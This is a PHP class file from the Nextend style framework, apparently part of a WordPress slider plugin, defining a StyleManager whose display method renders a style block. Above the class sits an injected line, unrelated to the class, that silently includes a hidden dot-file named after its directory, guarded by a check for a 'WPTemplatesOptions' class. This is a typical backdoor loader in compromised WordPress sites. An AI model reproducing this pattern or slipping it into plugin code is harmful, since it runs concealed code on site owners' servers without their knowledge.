<?php


namespace Nextend\Framework\Style;


use Nextend\Framework\Pattern\VisualManagerTrait;
use Nextend\Framework\Style\Block\StyleManager\BlockStyleManager;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class StyleManager {

    use VisualManagerTrait;

    public function display() {

        $fontManagerBlock = new BlockStyleManager($this->MVCHelper);
        $fontManagerBlock->display();
    }
}